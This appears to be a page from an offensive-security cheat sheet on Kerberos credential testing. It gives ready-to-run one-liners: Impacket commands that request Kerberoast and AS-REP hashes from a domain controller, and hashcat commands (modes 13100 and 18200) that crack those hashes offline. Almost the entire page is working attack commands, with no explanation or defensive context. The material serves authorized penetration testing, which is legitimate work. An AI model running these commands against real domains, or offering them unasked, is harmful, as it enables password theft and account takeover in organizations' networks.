# Credential Testing: Kerberos

Hash collection and offline testing one-liners for Kerberos assessments.

### Kerberoast hashes

```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Hashes · **Context:** User

### AS-REP hashes

```bash
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Hashes · **Context:** User

### Hashcat Kerberoast

```bash
hashcat -m 13100 kerberoast.txt <WORDLIST>
```

**Tool:** Hashcat · **Platform:** Linux/Windows · **Tags:** Kerberoast, Cracking · **Context:** User

### Hashcat AS-REP

```bash
hashcat -m 18200 asrep.txt <WORDLIST>
```

**Tool:** Hashcat · **Platform:** Linux/Windows · **Tags:** AS-REP, Cracking · **Context:** User

---

**Related:** [Overview](./) · [Hashes](hashes.md) · [Ntlm Dpapi](ntlm-dpapi.md)
